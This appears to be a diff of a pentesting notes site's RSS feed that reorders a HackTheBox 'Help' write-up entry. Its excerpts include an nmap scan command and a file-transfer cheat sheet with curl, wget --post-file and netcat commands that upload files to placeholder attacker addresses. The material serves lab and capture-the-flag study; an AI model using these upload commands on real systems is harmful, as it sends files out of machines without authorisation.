@@ -12,16 +12,6 @@
     
     <item>
       <title></title>
-      <link>/hackthebox/boxes/help/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/hackthebox/boxes/help/</guid>
-      <description>Modified from the Debian original for Ubuntu Last updated: 2014-03-19  so nmap reveals two ports, its running node js on an apache 2014 box, ssh seems up to date. initial go buster scans didn&amp;rsquo;t give much on the serfuce but after enumerating support it revealed some more directories.
-# Nmap 7.70 scan initiated Mon Jan 21 19:30:29 2019 as: nmap -sC -sV -p- -Pn -T4 -oA total-help help.htb Nmap scan report for help.</description>
-    </item>
-    
-    <item>
-      <title></title>
       <link>/hackthebox/challenges/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
@@ -145,6 +135,16 @@ upload = nc -w 3 [your_ip] 1337 &amp;lt; file.txt listener = nc -lp 1337 &amp;gt
       
       <guid>/filetransfer/</guid>
       <description>##################Linux########################## 1# Python http server listener = python3 -m http.server 9090 listener = python -m simpleHTTPServer 9090 upload = curl -F &#39;data=@home/Documents&#39; IP_ADDRESS download = curl http://IP_ADDRESS -o file Note for wget post method youll need to use netcat instead of python doesn&#39;t support post. upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename 2# Netcat notice with this method , sender &amp;lt;, reciever &amp;gt;. -w wait, -l listener -p port upload = nc -w 3 [your_ip] 1337 &amp;lt; file.</description>
+    </item>
+    
+    <item>
+      <title>HELP</title>
+      <link>/hackthebox/boxes/help/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/help/</guid>
+      <description>Modified from the Debian original for Ubuntu Last updated: 2014-03-19  so nmap reveals two ports, its running node js on an apache 2014 box, ssh seems up to date. initial go buster scans didn&amp;rsquo;t give much on the serfuce but after enumerating support it revealed some more directories.
+# Nmap 7.70 scan initiated Mon Jan 21 19:30:29 2019 as: nmap -sC -sV -p- -Pn -T4 -oA total-help help.htb Nmap scan report for help.</description>
     </item>
     
     <item>
